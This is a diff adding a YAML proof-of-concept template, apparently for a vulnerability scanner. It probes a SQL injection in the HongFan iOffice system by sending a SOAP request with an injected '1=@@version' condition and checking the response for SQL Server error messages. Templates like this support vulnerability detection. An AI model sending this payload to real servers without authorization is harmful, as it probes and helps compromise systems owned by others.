@@ -1,0 +1,22 @@
+id: poc-yaml-hongfan-ioffice-system-sql-injection
+info:
+  name: HongFan iOffice System SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: HongFan
+  osprey-id: vb_2022_0105
+requests:
+- method: POST
+  path: /iOffice/prg/set/wss/udfmr.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetEmpSearch
+    xmlns="http://tempuri.org/ioffice/udfmr"><condition>1=@@version</condition></GetEmpSearch></soap:Body></soap:Envelope>
+  expression: 'contains(body, "System.Data.SqlClient.SqlException") && contains(body,
+    "Microsoft SQL Server")
+
+    '
+variables: {}
+transport: http
